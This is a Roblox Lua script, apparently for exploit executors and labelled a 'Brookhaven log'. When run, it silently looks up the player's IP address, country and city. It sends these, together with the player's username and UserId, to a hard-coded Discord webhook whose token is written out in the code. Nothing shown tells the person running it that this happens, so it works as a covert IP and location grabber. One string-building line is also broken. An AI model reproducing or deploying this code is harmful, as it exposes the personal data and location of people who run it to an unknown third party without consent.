local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local player = game.Players.LocalPlayer
local requestFunc = (http_request or request or syn and syn.request or fluxus and fluxus.request)

local webhook = "https://discord.com/api/webhooks/1368601195530162216/T8g61_uQxgBS97IRgdmVDgl8SFT02LKUJTYCUJwrA5-Tq_wcaSTKj6Uco0uZCqqbGe7F"

local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local gameName = gameInfo.Name or "Jogo desconhecido"
local dataHora = os.date("%d/%m/%Y %H:%M:%S")

local ip = "IP n√£o dispon√≠vel"
local pais = "Pa√≠s n√£o dispon√≠vel"
local cidade = "Cidade n√£o dispon√≠vel"

if requestFunc then
    local ipResponse = requestFunc({
        Url = "http://ip-api.com/json/",
        Method = "GET"
    })
    if ipResponse and ipResponse.Body then
        local geoData = HttpService:JSONDecode(ipResponse.Body)
        ip = geoData.query or ip
        pais = geoData.country or pais
        cidade = geoData.city or cidade
    end
end

local embed = {
    title = "üìÑ RCW Brookhaven log ‚Äî " .. player.Name,
    description = "O script foi executado no jogo **" ..",
    color = 65280,
    fields = {
        { name = "UserId", value = tostring(player.UserId), inline = true },
        { name = "PlaceId", value = tostring(game.PlaceId), inline = true },
        { name = "Hor√°rio de Execu√ß√£o", value = dataHora, inline = false },
        { name = "IP", value = ip, inline = false },
        { name = "Pa√≠s", value = pais, inline = true },
        { name = "Cidade", value = cidade, inline = true }
    },
    footer = { text = "By CrowlyAC ‚Ä¢ Sintelx.gg" },
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

local payload = {
    embeds = {embed}
}
local json = HttpService:JSONEncode(payload)

if webhook and requestFunc then
    requestFunc({
        Url = webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = json
    })
end
